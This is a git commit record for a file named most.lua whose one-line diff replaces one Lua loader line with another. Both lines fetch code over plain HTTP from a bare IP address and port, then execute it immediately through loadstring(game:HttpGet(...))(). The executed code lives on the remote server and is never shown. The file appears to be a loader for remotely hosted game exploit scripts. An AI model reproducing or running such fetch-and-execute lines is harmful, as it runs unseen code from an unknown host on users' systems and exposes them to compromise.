9394d2e6444df6bf7f1f2c467af1a9e4f23f72d3
leonix <furkan62.bakir@gmail.com>
2026-02-16 00:41:10 +0300

    Update most.lua

--- most.lua
+++ most.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjRlYWJlODhlLTllMzYtNGFlNC05ZDA2LTFkYmZiYTc0Yzc0OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
